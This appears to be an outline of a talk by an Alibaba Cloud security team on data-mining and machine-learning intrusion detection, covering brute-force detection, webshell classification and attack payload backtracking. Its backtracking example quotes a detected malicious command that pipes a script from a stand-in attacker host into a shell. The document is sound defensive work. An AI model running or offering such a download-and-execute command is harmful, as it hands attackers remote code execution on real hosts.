## Introduction
This presentation focuses on enhancing security awareness through data mining and data-driven intrusion detection solutions in Alibaba Cloud. The team, consisting of Han Zheng, Yue Xu, and Wei He, is responsible for implementing algorithms and maintaining intrusion detection and threat intelligence for the Alibaba Cloud Security Center.

## Team Overview
We are a research-engineering team that implements algorithms and maintains intrusion detection and threat intelligence for the Alibaba Cloud Security Center.

### Members
- Han Zheng
- Yue Xu
- Wei He

## Advantages of Cloud + Security
- **Data Computing Ability**: Leveraging powerful data processing capabilities.
- **Rich Security Logs**: Access to extensive and detailed security logs.
- **Comprehensive Data Vision**: A holistic view of the data landscape.

## Challenges
- **Massive Business Environment**: Handling large-scale and complex business environments.
- **Diverse Adversaries**: Dealing with a wide range of attackers, from script kiddies to nation-states.
- **Balancing Precision and Recall**: Ensuring both high precision and recall in detection.

## Data Flow and Threat Modeling
### Table of Threat Modeling Cases
- **Brute-force Attack**
- **Malicious Behavior Chain**
- **Malicious Web Script (a.k.a. webshell)**
- **Attack Payload Backtracking**

### Rule-based Decision Problem
- **Features of Server Login Events**:
  - Balancing false positives and true negatives is challenging.
  - Different servers exhibit different behaviors, making prior knowledge less adaptive.

### Multivariate Gauss Model
- **Finding Abnormal Behaviors**:
  - Utilizing Gaussian distribution to identify abnormal patterns.

### Malicious Behavior Chain
- **Pattern Mining**:
  - Analyzing links between process, file, and network entities.
  - Generating strong association rules.
  - Using DDG Miner commands for pattern matching.

### Malicious Web Script
- **Types of Malicious PHP Scripts (webshells)**:
  - Features include text, dynamic function calls, and opcode.
- **Machine Learning Performance**:
  - Daily infected hosts (February to April).
  - Lab performance: Tested on 30,000 samples, achieving F1=98.78%, AUC=99.97%.
  - Online performance: Increased detections by 17% with only one false positive alert in three months.

### Automated Attack Backtracking
- **Example**:
  - Found malicious process: `curl http://evil.com/shell.sh | sh`
  - Tracing the attack: Analyzing the attacker's HTTP request.
- **Text Similarity Analysis**:
  - Addressing encoded or encrypted payloads.
- **Encoded Payload Backtracking**:
  - Solving backtracking without relying on text features or vulnerability knowledge.
  - Applicable to one-to-many attacks.
  - Examples:
    - Webshell connection flow with base64-encoded payload.
    - Java deserialization exploit with Java serialization.
    - RCE caused by SQL injection with a special hex-like string.

## Key Takeaways
- **Label Data Scarcity and Unclear Threat Boundaries**:
  - These factors limit the performance of machine learning in security scenarios.
- **AI in Cybersecurity**:
  - AI is not a "silver bullet" against cyber threats. It is crucial to determine when and how to use AI and quantify its improvement.
- **No Free Lunch Theorem**:
  - Algorithm selection must be based on the specific project requirements.

## Threat Modeling Cases
- **Brute-force Attack**
- **Abnormal Process Startup**
- **Malicious Web Script (a.k.a. webshell)**
- **Attack Payload Backtracking**
